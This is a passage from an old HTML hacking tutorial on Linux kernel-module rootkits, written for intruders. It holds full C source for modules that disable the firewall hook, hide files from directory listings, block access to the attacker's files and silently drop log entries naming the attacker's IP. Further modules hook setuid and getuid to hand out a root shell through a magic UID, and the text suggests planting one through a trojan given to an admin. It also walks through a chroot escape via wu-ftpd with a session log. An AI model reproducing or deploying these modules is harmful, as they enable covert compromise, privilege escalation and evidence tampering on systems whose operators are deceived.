                                                                                                                                                        getgid()                                = 100
                                                                                                                                                        getegid()                               = 100
                                                                                                                                                    </xmp>

                                                                                                                                                    Take a look at II.6 for an implementation of that problem. This way of analysing
                                                                                                                                                    programs is also very important for a quick look at other standard tools.<br>
                                                                                                                                                    I hope you are now able to find any systemcall which can help you to hide
                                                                                                                                                    yourself or just to backdoor the system, or whatever you want.

                                                                                                                                                    <H3><A NAME="II.3."></A>3. Confusing the kernel's System Table</h3>

                                                                                                                                                    In II.1 you saw how to access the sys_call_table, which is exported through the
                                                                                                                                                    kernel symbol table. Now think about this... We can modify <i>any</i> exported item
                                                                                                                                                    (functions, structures, variables, for example) by accessing them within our
                                                                                                                                                    module.<br>
                                                                                                                                                    Anything listed in /proc/ksyms can be corrupted. Remember that our module cannot
                                                                                                                                                    be compromised that way, because we don't export any symbols. Here is a little
                                                                                                                                                    excerpt from my /proc/ksyms file, just to show you what you can actually modify.

                                                                                                                                                    <xmp>
                                                                                                                                                        ...
                                                                                                                                                        001bf1dc ppp_register_compressor
                                                                                                                                                        001bf23c ppp_unregister_compressor
                                                                                                                                                        001e7a10 ppp_crc16_table
                                                                                                                                                        001b9cec slhc_init
                                                                                                                                                        001b9ebc slhc_free
                                                                                                                                                        001baa20 slhc_remember
                                                                                                                                                        001b9f6c slhc_compress
                                                                                                                                                        001ba5dc slhc_uncompress
                                                                                                                                                        001babbc slhc_toss
                                                                                                                                                        001a79f4 register_serial
                                                                                                                                                        001a7b40 unregister_serial
                                                                                                                                                        00109cec dump_thread
                                                                                                                                                        00109c98 dump_fpu
                                                                                                                                                        001c0c90 __do_delay
                                                                                                                                                        001c0c60 down_failed
                                                                                                                                                        001c0c80 down_failed_interruptible
                                                                                                                                                        001c0c70 up_wakeup
                                                                                                                                                        001390dc sock_register
                                                                                                                                                        00139110 sock_unregister
                                                                                                                                                        0013a390 memcpy_fromiovec
                                                                                                                                                        001393c8 sock_setsockopt
                                                                                                                                                        00139640 sock_getsockopt
                                                                                                                                                        001398c8 sk_alloc
                                                                                                                                                        001398f8 sk_free
                                                                                                                                                        00137b88 sock_wake_async
                                                                                                                                                        00139a70 sock_alloc_send_skb
                                                                                                                                                        0013a408 skb_recv_datagram
                                                                                                                                                        0013a580 skb_free_datagram
                                                                                                                                                        0013a5cc skb_copy_datagram
                                                                                                                                                        0013a60c skb_copy_datagram_iovec
                                                                                                                                                        0013a62c datagram_select
                                                                                                                                                        00141480 inet_add_protocol
                                                                                                                                                        001414c0 inet_del_protocol
                                                                                                                                                        001ddd18 rarp_ioctl_hook
                                                                                                                                                        001bade4 init_etherdev
                                                                                                                                                        00140904 ip_rt_route
                                                                                                                                                        001408e4 ip_rt_dev
                                                                                                                                                        00150b84 icmp_send
                                                                                                                                                        00143750 ip_options_compile
                                                                                                                                                        001408c0 ip_rt_put
                                                                                                                                                        0014faa0 arp_send
                                                                                                                                                        0014f5ac arp_bind_cache
                                                                                                                                                        001dd3cc ip_id_count
                                                                                                                                                        0014445c ip_send_check
                                                                                                                                                        00142bc0 ip_forward
                                                                                                                                                        001dd3c4 sysctl_ip_forward
                                                                                                                                                        0013a994 register_netdevice_notifier
                                                                                                                                                        0013a9c8 unregister_netdevice_notifier
                                                                                                                                                        0013ce00 register_net_alias_type
                                                                                                                                                        0013ce4c unregister_net_alias_type
                                                                                                                                                        001bb208 register_netdev
                                                                                                                                                        001bb2e0 unregister_netdev
                                                                                                                                                        001bb090 ether_setup
                                                                                                                                                        0013d1c0 eth_type_trans
                                                                                                                                                        0013d318 eth_copy_and_sum
                                                                                                                                                        0014f164 arp_query
                                                                                                                                                        00139d84 alloc_skb
                                                                                                                                                        00139c90 kfree_skb
                                                                                                                                                        00139f20 skb_clone
                                                                                                                                                        0013a1d0 dev_alloc_skb
                                                                                                                                                        0013a184 dev_kfree_skb
                                                                                                                                                        0013a14c skb_device_unlock
                                                                                                                                                        0013ac20 netif_rx
                                                                                                                                                        0013ae0c dev_tint
                                                                                                                                                        001e6ea0 irq2dev_map
                                                                                                                                                        0013a7a8 dev_add_pack
                                                                                                                                                        0013a7e8 dev_remove_pack
                                                                                                                                                        0013a840 dev_get
                                                                                                                                                        0013b704 dev_ioctl
                                                                                                                                                        0013abfc dev_queue_xmit
                                                                                                                                                        001e79a0 dev_base
                                                                                                                                                        0013a8dc dev_close
                                                                                                                                                        0013ba40 dev_mc_add
                                                                                                                                                        0014f3c8 arp_find
                                                                                                                                                        001b05d8 n_tty_ioctl
                                                                                                                                                        001a7ccc tty_register_ldisc
                                                                                                                                                        0012c8dc kill_fasync
                                                                                                                                                        0014f164 arp_query
                                                                                                                                                        00155ff8 register_ip_masq_app
                                                                                                                                                        0015605c unregister_ip_masq_app
                                                                                                                                                        00156764 ip_masq_skb_replace
                                                                                                                                                        00154e30 ip_masq_new
                                                                                                                                                        00154e64 ip_masq_set_expire
                                                                                                                                                        001ddf80 ip_masq_free_ports
                                                                                                                                                        001ddfdc ip_masq_expire
                                                                                                                                                        001548f0 ip_masq_out_get_2
                                                                                                                                                        001391e8 register_firewall
                                                                                                                                                        00139258 unregister_firewall
                                                                                                                                                        00139318 call_in_firewall
                                                                                                                                                        0013935c call_out_firewall
                                                                                                                                                        001392d4 call_fw_firewall
                                                                                                                                                        ...
                                                                                                                                                    </xmp>
                                                                                                                                                    Just look at call_in_firewall, this is a function used by the firewall management
                                                                                                                                                    in the kernel. What would happen if we replace this function with a bogus one ?<br>
                                                                                                                                                    Take a look at the following LKM :

                                                                                                                                                    <xmp>
                                                                                                                                                        #define MODULE
                                                                                                                                                        #define __KERNEL__

                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <asm/unistd.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <sys/types.h>
                                                                                                                                                        #include <asm/fcntl.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <linux/dirent.h>
                                                                                                                                                        #include <sys/mman.h>
                                                                                                                                                        #include <linux/string.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/malloc.h>


                                                                                                                                                        /*get the exported function*/
                                                                                                                                                        extern int *call_in_firewall;

                                                                                                                                                        /*our nonsense call_in_firewall*/
                                                                                                                                                        int new_call_in_firewall()
                                                                                                                                                        {
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            call_in_firewall=new_call_in_firewall;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                        }
                                                                                                                                                    </xmp>
                                                                                                                                                    Compile / load this LKM and do a 'ipfwadm -I -a deny'. After this do a 'ping
                                                                                                                                                    127.0.0.1', your kernel will produce a nice error message, because the called
                                                                                                                                                    call_in_firewall(...) function was replaced by a bogus one (you may skip the
                                                                                                                                                    firewall installation in this example).<br>
                                                                                                                                                    This is a quite brutal way of killing an exported symbol. You could also
                                                                                                                                                    disassemble (using gdb) a certain symbol and modify certain bytes which will
                                                                                                                                                    change the working of that symbol. Imagine there is a IF THEN contruction used
                                                                                                                                                    in an exported function. How about disassembling this function and searching for
                                                                                                                                                    commands like JNZ, JNE, ... This way you would be able to patch important items.
                                                                                                                                                    Of course, you could lookup the functions in the kernel / module sources, but
                                                                                                                                                    what about symbols you cannot get the source for because you only got a binary
                                                                                                                                                    module. Here the disassembling is quite interesting.<br>


                                                                                                                                                    <H3><A NAME="II.4."></A>4. Filesystem related Hacks</h3>

                                                                                                                                                    The most important feature of LKM hacking is the abilaty to hide some items
                                                                                                                                                    (your exploits, sniffer (+logs), and so on) in the local filesystem.

                                                                                                                                                    <H4><A NAME="II.4.1."></A>4.1  How to Hide Files</h4>
                                                                                                                                                    Imagine how an admin will find your files : He will use 'ls' and see everything.
                                                                                                                                                    For those who don't know it, strace'in through 'ls' will show you that the
                                                                                                                                                    systemcall used for getting directory listings is

                                                                                                                                                    <xmp>
                                                                                                                                                        int sys_getdents (unsigned int fd, struct dirent *dirent, unsigned int count);
                                                                                                                                                    </xmp>
                                                                                                                                                    So we know where to attack.The following piece of code shows the hacked_getdents
                                                                                                                                                    systemcall adapted from AFHRM (from  Michal Zalewski). This module is able to
                                                                                                                                                    hide any file from 'ls' and <i>every</i> program using getdents systemcall.

                                                                                                                                                    <xmp>
                                                                                                                                                        #define MODULE
                                                                                                                                                        #define __KERNEL__

                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <asm/unistd.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <sys/types.h>
                                                                                                                                                        #include <asm/fcntl.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <linux/dirent.h>
                                                                                                                                                        #include <sys/mman.h>
                                                                                                                                                        #include <linux/string.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/malloc.h>

                                                                                                                                                        extern void* sys_call_table[];

                                                                                                                                                        int (*orig_getdents) (uint, struct dirent *, uint);

                                                                                                                                                        int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
                                                                                                                                                        {
                                                                                                                                                            unsigned int tmp, n;
                                                                                                                                                            int t, proc = 0;
                                                                                                                                                            struct inode *dinode;
                                                                                                                                                            struct dirent *dirp2, *dirp3;
                                                                                                                                                            char hide[]="ourtool";                       /*the file to hide*/

                                                                                                                                                            /*call original getdents -> result is saved in tmp*/
                                                                                                                                                            tmp = (*orig_getdents) (fd, dirp, count);

                                                                                                                                                            /*directory cache handling*/
                                                                                                                                                            /*this must be checked because it could be possible that a former getdents
 put the results into the task process structure's dcache*/
                                                                                                                                                            #ifdef __LINUX_DCACHE_H
                                                                                                                                                            dinode = current->files->fd[fd]->f_dentry->d_inode;
                                                                                                                                                            #else
                                                                                                                                                            dinode = current->files->fd[fd]->f_inode;
                                                                                                                                                            #endif

                                                                                                                                                            /*dinode is the inode of the required directory*/
                                                                                                                                                            if (tmp > 0)
                                                                                                                                                        {
                                                                                                                                                            /*dirp2 is a new dirent structure*/
                                                                                                                                                            dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
                                                                                                                                                            /*copy original dirent structure to dirp2*/
                                                                                                                                                            memcpy_fromfs(dirp2, dirp, tmp);
                                                                                                                                                            /*dirp3 points to dirp2*/
                                                                                                                                                            dirp3 = dirp2;
                                                                                                                                                            t = tmp;
                                                                                                                                                            while (t > 0)
                                                                                                                                                        {
                                                                                                                                                            n = dirp3->d_reclen;
                                                                                                                                                            t -= n;
                                                                                                                                                            /*check if current filename is the name of the file we want to hide*/
                                                                                                                                                            if (strstr((char *) &(dirp3->d_name), (char *) &hide) != NULL)
                                                                                                                                                        {
                                                                                                                                                            /*modify dirent struct if necessary*/
                                                                                                                                                            if (t != 0)
                                                                                                                                                            memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);
                                                                                                                                                            else
                                                                                                                                                            dirp3->d_off = 1024;
                                                                                                                                                            tmp -= n;
                                                                                                                                                        }
                                                                                                                                                            if (dirp3->d_reclen == 0)
                                                                                                                                                        {
                                                                                                                                                            /*
     * workaround for some shitty fs drivers that do not properly
     * feature the getdents syscall.
    */
                                                                                                                                                            tmp -= t;
                                                                                                                                                            t = 0;
                                                                                                                                                        }
                                                                                                                                                            if (t != 0)
                                                                                                                                                            dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
                                                                                                                                                        }
                                                                                                                                                            memcpy_tofs(dirp, dirp2, tmp);
                                                                                                                                                            kfree(dirp2);
                                                                                                                                                        }
                                                                                                                                                            return tmp;
                                                                                                                                                        }


                                                                                                                                                        int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            orig_getdents=sys_call_table[SYS_getdents];
                                                                                                                                                            sys_call_table[SYS_getdents]=hacked_getdents;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_getdents]=orig_getdents;

                                                                                                                                                        }

                                                                                                                                                    </xmp>
                                                                                                                                                    For beginners : read the comments and use your brain for 10 mins. <br>
                                                                                                                                                    After that continue reading.<br>
                                                                                                                                                    This hack is really helpful. But remember that the admin can see your file by
                                                                                                                                                    directly accessing it. So a 'cat ourtool' or 'ls ourtool' will show him our
                                                                                                                                                    file. So never take any trivial names for your tools like sniffer, mountdxpl.c,
                                                                                                                                                    .... Of course their are ways to prevent an admin from reading our files, just
                                                                                                                                                    read on.<br>

                                                                                                                                                    <H4><A NAME="II.4.2."></A>4.2  How to hide the file contents (totally)</h4>

                                                                                                                                                    I never saw an implementation really doing this. Of course their are LKMs like
                                                                                                                                                    AFHRM by Michal Zalewski controlling the contents / delete functions  but not
                                                                                                                                                    really hiding the contents. I suppose their are lots of people actually using
                                                                                                                                                    methods like this, but no one wrote on it, so I do.<br>
                                                                                                                                                    It should be clear that there are many ways of doing this. The first way is
                                                                                                                                                    very simple,just intercept an open systemcall checking if filename is 'ourtool'.
                                                                                                                                                    If so deny any open-attempt, so no read / write or whatever is possible. Let's
                                                                                                                                                    implement that LKM :<br>

                                                                                                                                                    <xmp>
                                                                                                                                                        #define MODULE
                                                                                                                                                        #define __KERNEL__

                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <asm/unistd.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <sys/types.h>
                                                                                                                                                        #include <asm/fcntl.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <linux/dirent.h>
                                                                                                                                                        #include <sys/mman.h>
                                                                                                                                                        #include <linux/string.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/malloc.h>

                                                                                                                                                        extern void* sys_call_table[];


                                                                                                                                                        int (*orig_open)(const char *pathname, int flag, mode_t mode);


                                                                                                                                                        int hacked_open(const char *pathname, int flag, mode_t mode)
                                                                                                                                                        {
                                                                                                                                                            char *kernel_pathname;
                                                                                                                                                            char hide[]="ourtool";

                                                                                                                                                            /*this is old stuff -> transfer to kernel space*/
                                                                                                                                                            kernel_pathname = (char*) kmalloc(256, GFP_KERNEL);

                                                                                                                                                            memcpy_fromfs(kernel_pathname, pathname, 255);

                                                                                                                                                            if (strstr(kernel_pathname, (char*)&hide ) != NULL)
                                                                                                                                                        {
                                                                                                                                                            kfree(kernel_pathname);
                                                                                                                                                            /*return error code for 'file does not exist'*/
                                                                                                                                                            return -ENOENT;
                                                                                                                                                        }
                                                                                                                                                            else
                                                                                                                                                        {
                                                                                                                                                            kfree(kernel_pathname);
                                                                                                                                                            /*everything ok, it is not our tool*/
                                                                                                                                                            return orig_open(pathname, flag, mode);
                                                                                                                                                        }
                                                                                                                                                        }


                                                                                                                                                        int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            orig_open=sys_call_table[SYS_open];
                                                                                                                                                            sys_call_table[SYS_open]=hacked_open;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_open]=orig_open;
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    This works very fine, it tells anyone trying to access our files, that they
                                                                                                                                                    are non-existent. But how do we access those files. Well there are many ways
                                                                                                                                                    <ul>
                                                                                                                                                        <li>implement a magic-string<br>
                                                                                                                                                            <li>implement uid or gid check (requires creating a certain account)<br>
                                                                                                                                                                <li>implement a time check<br>
                                                                                                                                                                    <li>...<br>
                                                                                                                                                    </ul>
                                                                                                                                                    There are thousands of possibilies which are all very easy to implement, so I
                                                                                                                                                    leave this as an exercise for the reader.

                                                                                                                                                    <H4><A NAME="II.4.3."></A>4.3  How to hide certain file parts (a prototype implementation)</h4>


                                                                                                                                                    Well the method shown in 3.2 is very useful for our own tools / logs. But
                                                                                                                                                    what about modifying admin / other user files. Imagine you want to control
                                                                                                                                                    /var/log/messages for entries concerning your IP address / DNS name. We all
                                                                                                                                                    know thousands of backdoors hiding our identity from any important logfile.
                                                                                                                                                    But what about a LKM just filtering every string (data) written to a file. If
                                                                                                                                                    this string contains any data concerning our identity (IP address, for example)
                                                                                                                                                    we deny that write (we will just skip it/return). The following implementation
                                                                                                                                                    is a very (!!) basic prototype (!!) LKM, just for showing it. I never saw it
                                                                                                                                                    before, but as in 3.2 there may be some people using this since years.

                                                                                                                                                    <xmp>
                                                                                                                                                        #define MODULE
                                                                                                                                                        #define __KERNEL__

                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <asm/unistd.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <sys/types.h>
                                                                                                                                                        #include <asm/fcntl.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <linux/dirent.h>
                                                                                                                                                        #include <sys/mman.h>
                                                                                                                                                        #include <linux/string.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/malloc.h>

                                                                                                                                                        extern void* sys_call_table[];


                                                                                                                                                        int (*orig_write)(unsigned int fd, char *buf, unsigned int count);

                                                                                                                                                        int hacked_write(unsigned int fd, char *buf, unsigned int count)
                                                                                                                                                        {
                                                                                                                                                            char *kernel_buf;
                                                                                                                                                            char hide[]="127.0.0.1"; /*the IP address we want to hide*/

                                                                                                                                                            kernel_buf = (char*) kmalloc(1000, GFP_KERNEL);

                                                                                                                                                            memcpy_fromfs(kernel_buf, buf, 999);

                                                                                                                                                            if (strstr(kernel_buf, (char*)&hide ) != NULL)
                                                                                                                                                        {
                                                                                                                                                            kfree(kernel_buf);
                                                                                                                                                            /*say the program, we have written 1 byte*/
                                                                                                                                                            return 1;
                                                                                                                                                        }
                                                                                                                                                            else
                                                                                                                                                        {
                                                                                                                                                            kfree(kernel_buf);
                                                                                                                                                            return orig_write(fd, buf, count);
                                                                                                                                                        }
                                                                                                                                                        }

                                                                                                                                                        int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            orig_write=sys_call_table[SYS_write];
                                                                                                                                                            sys_call_table[SYS_write]=hacked_write;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_write]=orig_write;
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    This LKM has several disadvantages, it does not check for the destination it
                                                                                                                                                    the write is used on (can be checked via fd; read on for a sample). This means
                                                                                                                                                    the even a 'echo '127.0.0.1'' will be printed.<br>
                                                                                                                                                    You can also modify the string which should be written, so that it shows an IP
                                                                                                                                                    address of someone you really like... But the general idea should be clear.<br>

                                                                                                                                                    <H4><A NAME="II.4.4."></A>4.4  How to redirect / monitor file operations</h4>


                                                                                                                                                    This idea is old, and was first implemented by Michal Zalewski in AFHRM.
                                                                                                                                                    I won't show any code here, because it is too easy to implemented (after
                                                                                                                                                    showing you II.4.3/II.4.2).There are many things you can monitor by redirection/
                                                                                                                                                    filesystem events :
                                                                                                                                                    <ul>
                                                                                                                                                        <li>someone writes to a file -> copy the contents to another file
                                                                                                                                                            =>this can be done with sys_write(...) redirection<br>
                                                                                                                                                                <li>someone was able to read a sensitve file -> monitor file reading of certain
                                                                                                                                                                    files<br>
                                                                                                                                                                        =>this can be done with sys_read(...) redirection<br>
                                                                                                                                                                        <li>someone opens a file -> we can monitor the whole system for such events<br>
                                                                                                                                                                            =>intercept sys_open(...) and write files opened to a logfile; this is
                                                                                                                                                                            the ways AFHRM monitors the files of a system (see IV.3 for source)<br>
                                                                                                                                                                            <li>link / unlink events -> monitor every link created<br>
                                                                                                                                                                                =>intercept sys_link(...) (see IV.3 for source)<br>
                                                                                                                                                                                <li>rename events -> monitor every file rename event<br>
                                                                                                                                                                                    =>intercept sys_rename(...) (see IV.4 for source)<br>
                                                                                                                                                                                    <li>...<br>
                                                                                                                                                    </ul>
                                                                                                                                                    These are very interesting points (especially for admins) because you can
                                                                                                                                                    monitor a whole system for file changes. In my opinion it would also be
                                                                                                                                                    interesting to monitor file / directory creations, which use commands like
                                                                                                                                                    'touch' and 'mkdir'.<br>
                                                                                                                                                    The command 'touch' (for example) does <i>not</i> use open for the creation process;
                                                                                                                                                    a strace shows us the following listing (excerpt) :

                                                                                                                                                    <xmp>
                                                                                                                                                        ...
                                                                                                                                                        stat("ourtool", 0xbffff798)             = -1 ENOENT (No such file or directory)
                                                                                                                                                        creat("ourtool", 0666)                  = 3
                                                                                                                                                        close(3)                                = 0
                                                                                                                                                        _exit(0)                                = ?
                                                                                                                                                    </xmp>

                                                                                                                                                    As you can see the system uses the systemcall sys_creat(..) to create new files.
                                                                                                                                                    I think it is not necessary to present a source,because this task is too trivial
                                                                                                                                                    just intercept sys_creat(...) and write every filename to logfile with
                                                                                                                                                    printk(...).<br>
                                                                                                                                                    This is the way AFHRM logs any important events.


                                                                                                                                                    <H4><A NAME="II.4.5."></A>4.5  How to avoid any file owner problems</h4>

                                                                                                                                                    This hack is not only filesystem related, it is also very important for general
                                                                                                                                                    permission problems. Have a guess which systemcall to intercept.Phrack (plaguez)
                                                                                                                                                    suggests hooking sys_setuid(...) with a magic UID. This means whenever a setuid
                                                                                                                                                    is used with this magic UID, the module will set the UIDs to 0 (SuperUser).<br>
                                                                                                                                                    Let's look at his implementation(I will only show the hacked_setuid systemcall):

                                                                                                                                                    <xmp>
                                                                                                                                                        ...
                                                                                                                                                        int hacked_setuid(uid_t uid)
                                                                                                                                                        {
                                                                                                                                                            int tmp;

                                                                                                                                                            /*do we have the magic UID (defined in the LKM somewhere before*/
                                                                                                                                                            if (uid == MAGICUID) {
                                                                                                                                                            /*if so set all UIDs to 0 (SuperUser)*/
                                                                                                                                                            current->uid = 0;
                                                                                                                                                            current->euid = 0;
                                                                                                                                                            current->gid = 0;
                                                                                                                                                            current->egid = 0;
                                                                                                                                                            return 0;
                                                                                                                                                        }
                                                                                                                                                            tmp = (*o_setuid) (uid);
                                                                                                                                                            return tmp;
                                                                                                                                                        }
                                                                                                                                                        ...
                                                                                                                                                    </xmp>

                                                                                                                                                    I think the following trick could also be very helpful in certain situation.
                                                                                                                                                    Imagine the following situation: You give a bad trojan to an (very silly) admin;
                                                                                                                                                    this trojan installs the following LKM on that system [i did not implement hide
                                                                                                                                                    features, just a prototype of my idea] :<vr>

                                                                                                                                                    <xmp>
                                                                                                                                                        #define MODULE
                                                                                                                                                        #define __KERNEL__

                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <asm/unistd.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <sys/types.h>
                                                                                                                                                        #include <asm/fcntl.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <linux/dirent.h>
                                                                                                                                                        #include <sys/mman.h>
                                                                                                                                                        #include <linux/string.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/malloc.h>

                                                                                                                                                        extern void* sys_call_table[];


                                                                                                                                                        int (*orig_getuid)();

                                                                                                                                                        int hacked_getuid()
                                                                                                                                                        {
                                                                                                                                                            int tmp;

                                                                                                                                                            /*check for our UID*/
                                                                                                                                                            if (current->uid=500) {
                                                                                                                                                            /*if its our UID -> this means we log in -> give us a rootshell*/
                                                                                                                                                            current->uid = 0;
                                                                                                                                                            current->euid = 0;
                                                                                                                                                            current->gid = 0;
                                                                                                                                                            current->egid = 0;
                                                                                                                                                            return 0;
                                                                                                                                                        }
                                                                                                                                                            tmp = (*orig_getuid) ();
                                                                                                                                                            return tmp;
                                                                                                                                                        }


                                                                                                                                                        int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            orig_getuid=sys_call_table[SYS_getuid];
                                                                                                                                                            sys_call_table[SYS_getuid]=hacked_getuid;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_getuid]=orig_getuid;
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    If this LKM is loaded on a system we are only a normal user, login will give us
                                                                                                                                                    a nice rootshell (the current process has SuperUser rights). As I said in part
                                                                                                                                                    I current points to the current task structure.

                                                                                                                                                    <H4><A NAME="II.4.6."></A>4.6  How to make a hacker-tools-directory unaccessible</h4>

                                                                                                                                                    For hackers it is often important to make the directory they use for their tools
                                                                                                                                                    (<i>advanced</i> hackers don't use the regular local filesystem to store their data).
                                                                                                                                                    Using the getdents approach helped us to hide directory/files. The open approach
                                                                                                                                                    helped us to make our files unaccessible. But how to make our directory
                                                                                                                                                    unaccessible ?<br>
                                                                                                                                                    Well - as always - take a look at include/sys/syscall.h; you should be able to
                                                                                                                                                    figure out SYS_chdir as the systemcall we need (for people who don't believe it
                                                                                                                                                    just strace the 'cd' command...). This time I won't give you any source, because
                                                                                                                                                    you just need to intercept sys_mkdir, and make a string comparison. After this
                                                                                                                                                    you should make a regular call (if it is not our directory) or return ENOTDIR
                                                                                                                                                    (standing for 'there exists no directory with that name'). Now your tools should
                                                                                                                                                    really be hidden from intermediate admins (advanced / paranoid ones will scan
                                                                                                                                                    the HDD at its lowest level, but who is paranoid today besides us ?!). It should
                                                                                                                                                    also be possible to defeat this HDD scan, because everything is based on
                                                                                                                                                    systemcalls.<br>

                                                                                                                                                    <H4><A NAME="II.4.7."></A>4.7  How to change CHROOT Environments </h4>

                                                                                                                                                    This idea is totally taken from HISPAHACK (hispahack.ccc.de). They published a
                                                                                                                                                    real good text on that theme ('Restricting a restricted FTP'). I will explain
                                                                                                                                                    their idea in some short words. Please note that the following example will
                                                                                                                                                    <i>not</i> work anymore, it is quite old (see wu-ftpd version). I just show
                                                                                                                                                    it in order to explain how you can escape from chroot environments using LKMs.
                                                                                                                                                    The following text is based on old software (wuftpd) so don't try to use it in newer
                                                                                                                                                    wu-ftpd versions, it <i>won't</i> work.<br>
                                                                                                                                                    HISPAHACK's paper is based on the idea of an restricted user FTP account which has the
                                                                                                                                                    following permission layout :<br>
                                                                                                                                                    <xmp>
                                                                                                                                                        drwxr-xr-x     6 user      users      1024 Jun 21 11:26 /home/user/
                                                                                                                                                        drwx--x--x     2 root      root       1024 Jun 21 11:26 /home/user/bin/
                                                                                                                                                    </xmp>
                                                                                                                                                    This scenario (which you can often find) the user (we) can rename the bin
                                                                                                                                                    directory, because it is in our home directory.<br>
                                                                                                                                                    Before doing anything like that let's take a look at whe working of wu.ftpd
                                                                                                                                                    (the server they used for explanation, but the idea is more general). If we
                                                                                                                                                    issue a LIST command ../bin/ls will be executed with UID=0 (EUID=user's uid).
                                                                                                                                                    Before the execution is actually done wu.ftpd will use chroot(...) in order to
                                                                                                                                                    set the process root directory in a way we are restricted to the home directory.
                                                                                                                                                    This prevents us from accessing other parts of the filesystem via our FTP account
                                                                                                                                                    (restricted).<br>
                                                                                                                                                    Now imagine we could replace /bin/ls with another program, this program would
                                                                                                                                                    be executed as root (uid=0). But what would we win, we cannot access the whole
                                                                                                                                                    system because of the chroot(...) call. This is the point where we need a LKM
                                                                                                                                                    helping us. We remove .../bin/ls with a program which loads a LKM supplied by
                                                                                                                                                    us. This module will intercept the sys_chroot(...) systemcall. It must be
                                                                                                                                                    changed in way it will no more restrict us. <br>
                                                                                                                                                    This means we only need to be sure that sys_chroot(...) is doing nothing.
                                                                                                                                                    HISPAHACK used a very radical way, they just modified sys_chroot(...) in a way
                                                                                                                                                    it only returns 0 and nothing more. After loading this LKM you can spawn a new
                                                                                                                                                    process without being restricted anymore. This means you can access the whole
                                                                                                                                                    system with uid=0. The following listing shows the example 'Hack-Session'
                                                                                                                                                    published by HISPAHACK :

                                                                                                                                                    <xmp>
                                                                                                                                                        thx:~# ftp
                                                                                                                                                        ftp> o ilm
                                                                                                                                                        Connected to ilm.
                                                                                                                                                        220 ilm FTP server (Version wu-2.4(4) Wed Oct 15 16:11:18 PDT 1997) ready.
                                                                                                                                                        Name (ilm:root): user
                                                                                                                                                        331 Password required for user.
                                                                                                                                                        Password:
                                                                                                                                                        230 User user logged in.&nbsp; Access restrictions apply.
                                                                                                                                                        Remote system type is UNIX.
                                                                                                                                                        Using binary mode to transfer files.</TT></PRE>
                                                                                                                                                    ftp> ls
                                                                                                                                                    200 PORT command successful.
                                                                                                                                                    150 Opening ASCII mode data connection for /bin/ls.
                                                                                                                                                    total 5
                                                                                                                                                    drwxr-xr-x  5 user              users                  1024 Jun 21 11:26 .
                                                                                                                                                    drwxr-xr-x  5 user              users                  1024 Jun 21 11:26 ..
                                                                                                                                                    d--x--x--x  2 root              root                   1024 Jun 21 11:26 bin
                                                                                                                                                    drwxr-xr-x  2 root              root                   1024 Jun 21 11:26 etc
                                                                                                                                                    drwxr-xr-x  2 user              users                  1024 Jun 21 11:26 home
                                                                                                                                                    226 Transfer complete.
                                                                                                                                                    ftp> cd ..
                                                                                                                                                    250 CWD command successful.
                                                                                                                                                    ftp> ls
                                                                                                                                                    200 PORT command successful.
                                                                                                                                                    150 Opening ASCII mode data connection for /bin/ls.
                                                                                                                                                    total 5
                                                                                                                                                    drwxr-xr-x  5 user              users                  1024 Jun 21 11:26 .
